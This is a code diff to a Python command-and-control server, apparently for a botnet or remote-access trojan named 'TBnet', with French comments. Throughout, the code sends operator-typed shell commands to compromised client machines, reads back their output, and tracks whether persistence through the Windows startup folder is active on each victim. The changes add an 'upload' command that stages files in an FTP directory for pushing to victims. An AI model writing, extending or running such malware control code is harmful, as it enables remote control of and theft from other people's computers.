@@ -9,6 +9,7 @@ import json
 import http.server
 import socketserver
 import argparse
+import shutil
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib import servers
 from pyftpdlib.handlers import FTPHandler
@@ -322,44 +323,51 @@ class Server:
                             cmd = input(f"{str(id_conn)} : {pwd} $> ")
                             if cmd != "":
                                 #print("pas egale a rien")
+                                splited_cmd = cmd.split()
                                 print(cmd)
-                                if "exit" in cmd:
+                                if cmd == "exit":
                                     self.local = True
                                     self.ordre = ""
                                     self.current_sessions = 0
                                     #print(str(self.local) + str(self.current_sessions) + self.ordre)
                                     #print("Fermeture de la session : " + str(id_conn))
                                     break
-                                else:
-                                    try:
-                                        connection.sendall(str.encode(cmd))
-                                    except socket.error as e:
-                                        print(str(e))
-                                        self.local = True
-                                        self.ordre = ""
-                                        self.current_sessions = 0
-                                        exit = True
-                                        break
-                                    try:
-                                        output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
-                                    except socket.error as e:
-                                        print(str(e))
-                                        self.local = True
-                                        self.ordre = ""
-                                        self.current_sessions = 0
-                                        exit = True
-                                        break
-                                    try:
-                                        results, pwd = output.split(self.SEPARATOR)
-                                    except:
-                                        results = "Les Données recu sont surrement trop grosse"
-                                    if "Persistance via dossier startup activé" in results:
-                                        print("Persistance correctement activé")
-                                        DefinirPersistance(mac_address, "ON")
-                                    if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
-                                        print("Persistance deja activer mise a jour du fichier client")
-                                        DefinirPersistance(mac_address, "ON")
-                                    print(results)
+                                if not cmd == "upload":
+                                    if splited_cmd[0] == "upload":
+                                        print(splited_cmd[1])
+                                        try:
+                                            shutil.copyfile(splited_cmd[1], "./ftp/" + splited_cmd[1])
+                                        except:
+                                            print("Erreur le fichier n'éxiste pas")
+                                try:
+                                    connection.sendall(str.encode(cmd))
+                                except socket.error as e:
+                                    print(str(e))
+                                    self.local = True
+                                    self.ordre = ""
+                                    self.current_sessions = 0
+                                    exit = True
+                                    break
+                                try:
+                                    output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                                except socket.error as e:
+                                    print(str(e))
+                                    self.local = True
+                                    self.ordre = ""
+                                    self.current_sessions = 0
+                                    exit = True
+                                    break
+                                try:
+                                    results, pwd = output.split(self.SEPARATOR)
+                                except:
+                                    results = "Les Données recu sont surrement trop grosse"
+                                if "Persistance via dossier startup activé" in results:
+                                    print("Persistance correctement activé")
+                                    DefinirPersistance(mac_address, "ON")
+                                if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
+                                    print("Persistance deja activer mise a jour du fichier client")
+                                    DefinirPersistance(mac_address, "ON")
+                                print(results)
                             #else:
                                 ##print("egale a rien")
             if exit:
@@ -370,15 +378,16 @@ class Server:
             if self.local == True:
                 if self.current_sessions == 0:  
                     lcmd = input("TBnet => ")
+                    splited_cmd = lcmd.split()
                     #print(lcmd + " local")
                     self.ordre = lcmd
                     #print(self.ordre)
-                    if "help" in lcmd:
+                    if lcmd == "help":
                         print(self.menu_help)
-                    if "exit" in lcmd:
+                    if lcmd == "exit":
                         self.stopClient = True
                         break
-                    if "clients" in lcmd:
+                    if lcmd == "clients":
                         AfficherClients(pathDb)
                     lcmd = ""
                     if "shell" in lcmd:
